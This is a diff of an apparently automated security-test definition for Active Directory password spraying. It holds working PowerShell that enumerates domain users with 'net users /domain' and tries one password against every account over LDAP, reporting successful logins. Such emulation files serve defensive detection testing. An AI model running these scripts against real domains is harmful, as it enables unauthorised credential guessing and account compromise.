@@ -7,68 +7,68 @@
   ],
   "steps": [
     {
-      "id": "b5e3bf87-a7ec-43f3-a728-9d49faa8d7a5",
+      "id": "114e7b9d-9b92-46b7-b34c-a9197d88de27",
       "type": "execute-command",
       "data": {
-        "command": "function Invoke-dpsLight ($Password, $userlist) {\n$users = Get-Content $userlist\n$Domain = \"LDAP://\" + ([ADSI]\"\").distinguishedName\nforeach ($User in $users) {\n  $Domain_check = New-Object System.DirectoryServices.DirectoryEntry($Domain, $User, $Password)\n  if ($Domain_check.name -ne $null) {\n    Write-Host -ForegroundColor Green \"Password found for User:$User Password:$Password\"\n  }\n  else { Write-Host \". \" -NoNewline}\n}\nWrite-Host -ForegroundColor green \"Finished\"\n}\nInvoke-dpsLight \"#{password}\" $env:Temp\\usersdpsLight.txt\n",
+        "command": "function Invoke-dpsLight ($Password, $userlist) {\n$users = Get-Content $userlist\n$Domain = \"LDAP://\" + ([ADSI]\"\").distinguishedName\nforeach ($User in $users) {\n  $Domain_check = New-Object System.DirectoryServices.DirectoryEntry($Domain, $User, $Password)\n  if ($Domain_check.name -ne $null) {\n    Write-Host -ForegroundColor Green \"Password found for User:$User Password:$Password\"\n  }\n  else { Write-Host \". \" -NoNewline}\n}\nWrite-Host -ForegroundColor green \"Finished\"\n}\nInvoke-dpsLight \"#{password}\" $env:Temp\\usersdpsLight.txt",
         "command_type": "powershell"
       },
       "elevation_required": false
     },
     {
-      "id": "2c90070b-e70e-4da9-aae9-47520d1ddd61",
+      "id": "ebdfe829-4164-41b8-a2fb-051149d99289",
       "name": "Check dependency 1/1",
       "description": "Username file must exist at $env:Temp\\usersdpsLight.txt\n",
       "type": "execute-command",
       "data": {
-        "command": "if (Test-Path  $env:Temp\\usersdpsLight.txt) {exit 0} else {exit 1}\n",
-        "command_type": ""
+        "command": "if (Test-Path  $env:Temp\\usersdpsLight.txt) {exit 0} else {exit 1}",
+        "command_type": "powershell"
       },
       "elevation_required": false
     },
     {
-      "id": "407131ba-10de-4257-a232-2e7e3e4d2864",
+      "id": "14e7b22e-c979-46ee-a1c6-d82b5f704047",
       "name": "Resolve dependency 1/1",
       "description": "Username file must exist at $env:Temp\\usersdpsLight.txt\n",
       "type": "execute-command",
       "data": {
-        "command": "Write-Host -NoNewLine \"Reading Users.\" # this code modifed from https://github.com/ZoomerHulkHogan/Powershell-Domain-User-Enumeration\n$netOutput = net users /domain\n$netOutput = [System.Collections.ArrayList]($netOutput[6..($netOutput.length-3)])\n$userLimit = #{user_limit}; $usercount = 0\nforeach ($line in $netOutput) {\n  if($usercount -ge $userLimit){break}\n  $line = $line.trim()\n  $line = $line -split '\\s\\s+'\n  foreach ($user in $line){\n    if($usercount -ge $userLimit){break}\n    Add-Content $env:Temp\\usersdpsLight.txt $user\n    $usercount = $usercount + 1\n    }  \n}\nWrite-Host \"Usernames saved to $env:Temp\\usersdpsLight.txt\"\n",
-        "command_type": ""
+        "command": "Write-Host -NoNewLine \"Reading Users.\" # this code modifed from https://github.com/ZoomerHulkHogan/Powershell-Domain-User-Enumeration\n$netOutput = net users /domain\n$netOutput = [System.Collections.ArrayList]($netOutput[6..($netOutput.length-3)])\n$userLimit = #{user_limit}; $usercount = 0\nforeach ($line in $netOutput) {\n  if($usercount -ge $userLimit){break}\n  $line = $line.trim()\n  $line = $line -split '\\s\\s+'\n  foreach ($user in $line){\n    if($usercount -ge $userLimit){break}\n    Add-Content $env:Temp\\usersdpsLight.txt $user\n    $usercount = $usercount + 1\n    }  \n}\nWrite-Host \"Usernames saved to $env:Temp\\usersdpsLight.txt\"",
+        "command_type": "powershell"
       },
       "elevation_required": false
     },
     {
-      "id": "308920de-fac4-4ad9-8169-d14637e6ec1f",
+      "id": "00aafd7e-f3df-48ab-9426-80e277bb4e59",
       "name": "Re-check dependency 1/1",
       "description": "Username file must exist at $env:Temp\\usersdpsLight.txt\n",
       "type": "execute-command",
       "data": {
-        "command": "if (Test-Path  $env:Temp\\usersdpsLight.txt) {exit 0} else {exit 1}\n",
-        "command_type": ""
+        "command": "if (Test-Path  $env:Temp\\usersdpsLight.txt) {exit 0} else {exit 1}",
+        "command_type": "powershell"
       },
       "elevation_required": false
     }
   ],
   "flows": [
     {
-      "s": "2c90070b-e70e-4da9-aae9-47520d1ddd61",
+      "s": "ebdfe829-4164-41b8-a2fb-051149d99289",
       "p": "on-success",
-      "o": "b5e3bf87-a7ec-43f3-a728-9d49faa8d7a5"
+      "o": "114e7b9d-9b92-46b7-b34c-a9197d88de27"
     },
     {
-      "s": "2c90070b-e70e-4da9-aae9-47520d1ddd61",
+      "s": "ebdfe829-4164-41b8-a2fb-051149d99289",
       "p": "on-failure",
-      "o": "407131ba-10de-4257-a232-2e7e3e4d2864"
+      "o": "14e7b22e-c979-46ee-a1c6-d82b5f704047"
     },
     {
-      "s": "407131ba-10de-4257-a232-2e7e3e4d2864",
+      "s": "14e7b22e-c979-46ee-a1c6-d82b5f704047",
       "p": "on-success",
-      "o": "308920de-fac4-4ad9-8169-d14637e6ec1f"
+      "o": "00aafd7e-f3df-48ab-9426-80e277bb4e59"
     },
     {
-      "s": "308920de-fac4-4ad9-8169-d14637e6ec1f",
+      "s": "00aafd7e-f3df-48ab-9426-80e277bb4e59",
       "p": "on-failure",
-      "o": "b5e3bf87-a7ec-43f3-a728-9d49faa8d7a5"
+      "o": "114e7b9d-9b92-46b7-b34c-a9197d88de27"
     }
   ],
   "tags": [
